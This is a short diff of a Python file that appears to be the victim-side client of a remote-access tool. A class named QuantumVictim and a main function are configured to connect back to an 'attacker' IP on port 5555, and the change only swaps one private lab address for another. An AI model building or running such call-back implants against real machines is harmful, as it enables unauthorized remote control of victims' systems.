@@ -462,7 +462,7 @@ if __name__ == "__main__":
 class QuantumVictim:
     """Main Victim Class - FIXED CONNECTION HANDLING"""
 
-    def __init__(self, attacker_ip='192.168.174.133', attacker_port=5555):
+    def __init__(self, attacker_ip='192.168.44.133', attacker_port=5555):
         self.attacker_ip = attacker_ip
         self.attacker_port = attacker_port
         self.socket = None
@@ -1136,7 +1136,7 @@ class QuantumVictim:
 
 def main():
     """Main function"""
-    ATTACKER_IP = "192.168.174.133"
+    ATTACKER_IP = "192.168.44.133"
     ATTACKER_PORT = 5555
 
     if len(sys.argv) >= 2:
@@ -1178,4 +1178,5 @@ if __name__ == "__main__":
         print("\n[VICTIM] Interrupted")
     except Exception as e:
         print(f"\n[VICTIM] Fatal error: {e}")
+
         traceback.print_exc()
